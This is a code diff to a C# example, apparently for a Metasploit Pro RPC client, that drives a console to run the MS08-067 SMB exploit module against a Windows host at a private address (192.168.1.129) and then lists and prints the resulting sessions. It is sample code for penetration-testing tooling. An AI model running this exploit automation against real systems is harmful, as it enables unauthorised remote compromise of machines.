@@ -15,19 +15,40 @@ namespace ModuleExecuteExample
 				
 				using (MetasploitProManager manager = new MetasploitProManager(session))
 				{
-					Dictionary<object, object> options = new Dictionary<object, object>();
+					//this commented block return a null job_id. No idea why.
+//					Dictionary<object, object> options = new Dictionary<object, object>();
+//					
+//					options.Add("RHOST", "192.168.1.129");
+//					
+//					Dictionary<object, object> response = manager.ExecuteModule("exploit", "exploit/windows/smb/ms08_067_netapi", options);
+//					
+//					foreach (KeyValuePair<object, object> pair in response)
+//						Console.WriteLine(pair.Key + ": " + pair.Value);
+				
+					var response = manager.CreateConsole();
 					
-					options.Add("RHOST", "192.168.1.129");
-					
-					Dictionary<object, object> response = manager.ExecuteModule("exploit", "windows/smb/ms08_067_netapi", options);
-					
-					foreach (KeyValuePair<object, object> pair in response)
+					foreach (var pair in response)
 						Console.WriteLine(pair.Key + ": " + pair.Value);
+					
+					string consoleID = response[(object)"id"] as string;
+					
+					response = manager.WriteToConsole(consoleID, "use exploit/windows/smb/ms08_067_netapi\n");
+					System.Threading.Thread.Sleep(600);
+					response = manager.WriteToConsole(consoleID, "set RHOST 192.168.1.129\n");
+					System.Threading.Thread.Sleep(600);
+					response = manager.WriteToConsole(consoleID, "exploit\n");
+					System.Threading.Thread.Sleep(600);
+					
+					manager.ReadConsole(consoleID);
 					
 					response = manager.ListSessions();
 					
-					foreach (KeyValuePair<object, object> pair in response)
-						Console.WriteLine(pair.Key + ": " + pair.Value);
+					System.Text.Encoding enc = System.Text.Encoding.ASCII;
+					foreach (var pair in response)
+						foreach (var p in pair.Value as Dictionary<object, object>)
+							Console.WriteLine(enc.GetString(p.Key as byte[]) + ": "  + enc.GetString(p.Value as byte[]));
+					
+					manager.DestroyConsole(consoleID);
 				}
 			}
 		}
